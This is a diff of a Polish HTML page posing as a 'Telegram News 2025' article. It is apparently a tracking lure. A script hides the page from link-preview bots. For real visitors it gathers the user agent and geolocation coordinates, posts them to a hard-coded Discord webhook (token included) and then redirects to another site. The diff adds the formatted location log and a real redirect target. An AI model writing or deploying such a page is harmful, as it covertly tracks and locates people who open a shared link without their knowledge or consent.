@@ -1,11 +1,11 @@
-
-
 <!DOCTYPE html>
 <html lang="pl">
 <head>
   <meta charset="UTF-8" />
   <title>Telegram News 2025</title>
   <meta name="description" content="Zobacz najnowsze informacje dotyczące prywatności i aplikacji Telegram.">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="icon" href="data:," />
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -23,20 +23,29 @@
 <body>
   <p class="loading">Ładowanie artykułu... Proszę czekać.</p>
 
+  <noscript>
+    <meta http-equiv="refresh" content="0; url=https://example.com/noscript" />
+  </noscript>
+
   <script>
     const ua = navigator.userAgent.toLowerCase();
     const botWords = ["bot", "crawl", "spider", "discord", "telegram", "preview", "facebook", "whatsapp", "slack"];
     const isBot = botWords.some(word => ua.includes(word));
 
-    const loggerUrl = "https://discord.com/api/webhooks/1364185353719906334/OFLyF26MgtEVbOw9VkAN21isLv2QisF6fd460pfAj-q0g42pgLWXI3ohHoz_wD6SSDUn"; // ← Wklej swój prawdziwy webhook Discorda
-
-    const redirectUrl = "https://example.com"; // ← Zmień na prawdziwy link końcowy
+    const loggerUrl = "https://discord.com/api/webhooks/1364185353719906334/OFLyF26MgtEVbOw9VkAN21isLv2QisF6fd460pfAj-q0g42pgLWXI3ohHoz_wD6SSDUn";
+    const redirectUrl = "https://detectivedigital.github.io/";
 
     function logAndRedirect(data) {
+      const logText = `Nowy wpis:
+UA: ${data.ua}
+Typ: ${data.type}
+Lokalizacja: ${data.lat ?? "?"}, ${data.lon ?? "?"}
+Błąd: ${data.error ?? "brak"}`;
+
       fetch(loggerUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: JSON.stringify(data, null, 2) })
+        body: JSON.stringify({ content: logText })
       }).finally(() => {
         window.location.href = redirectUrl;
       });
@@ -93,4 +102,5 @@
 
 
 
-
+   
+            
